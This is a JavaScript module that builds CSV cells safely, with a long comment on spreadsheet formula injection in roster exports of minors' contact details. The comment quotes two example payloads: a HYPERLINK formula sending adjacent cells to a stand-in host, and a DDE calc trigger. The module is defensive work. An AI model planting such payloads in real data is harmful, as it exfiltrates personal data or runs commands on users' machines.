/**
 * The one place a CSV cell is built.
 *
 * ── Why this module exists ──
 *
 * Three exports built CSV independently, and only one of them defended against
 * formula injection. `routes/adminRoutes.js` prefixed a leading `=`, `+`, `-`,
 * `@`, tab or CR with an apostrophe; `routes/attendanceRoutes.js` and
 * `views/OrganizerDashboard.jsx` escaped quotes and stopped.
 *
 * The two that stopped are the roster exports — the accepted volunteers for an
 * event, with names, emails, schools and grades. `attendanceRoutes.js` calls it
 * "the one bulk export of minors' contact details on the platform" in its own
 * audit comment.
 *
 * Nothing restricts the charset of `users.name`, and it should not: a name field
 * that rejects characters rejects people's names. So the defence has to be at
 * the point the value enters a spreadsheet format, which is here.
 *
 * ── What the attack actually is ──
 *
 * A spreadsheet treats a cell beginning with `=`, `+`, `-` or `@` as a formula,
 * even when the file it came from was quoted CSV. A student sets their name to
 *
 *     =HYPERLINK("https://evil.example/?d="&A1&B1,"Click")
 *
 * The organizer downloads the roster — the ordinary thing the product tells them
 * to do — opens it, and the formula resolves against the cells beside it, which
 * are the contact details of every other minor accepted to that shift. The
 * victim is the organizer; the payload is delivered by the platform; nothing the
 * organizer does is unreasonable.
 *
 * `=cmd|'/c calc'!A1` is the same trigger aimed at DDE rather than at
 * exfiltration.
 *
 * ── Why an apostrophe and not stripping ──
 *
 * A leading apostrophe tells every major spreadsheet to store the cell as text.
 * It preserves the characters, which matters: an export is evidence, and an
 * organizer looking at a roster after something went wrong needs to see what a
 * student actually typed, not a cleaned-up version of it. Stripping would also
 * corrupt legitimate values — a name is allowed to contain an equals sign.
 *
 * ── Numbers ──
 *
 * Callers pass numeric columns through as-is today (hours, grade, ids) rather
 * than through `csvCell`, and should keep doing that. `-5` would otherwise gain
 * an apostrophe and stop being a number, because the lead-character test cannot
 * tell a negative number from `-1+1` without becoming an expression parser. The
 * columns that carry user text are the ones that need this, and they are never
 * numeric.
 */

/**
 * Characters a spreadsheet reads as "this cell is a formula".
 *
 * Exported so a caller checking the same thing cannot quietly derive a shorter
 * set — the OWASP list, plus the two whitespace leads that Excel also honours.
 */
export const CSV_FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * One CSV cell: formula-neutralised, quoted, with embedded quotes doubled.
 *
 * `?? ''` rather than `|| ''` deliberately. One of the two originals used `||`,
 * which turns `0` into an empty cell — and `0` is a real grade and a real hours
 * total.
 */
export function csvCell(value) {
  const str = String(value ?? '');
  const guarded = CSV_FORMULA_LEAD.test(str) ? `'${str}` : str;
  return `"${guarded.replace(/"/g, '""')}"`;
}

/** One CSV row from an array of values, each cell independently quoted. */
export function csvRow(values) {
  return values.map(csvCell).join(',');
}
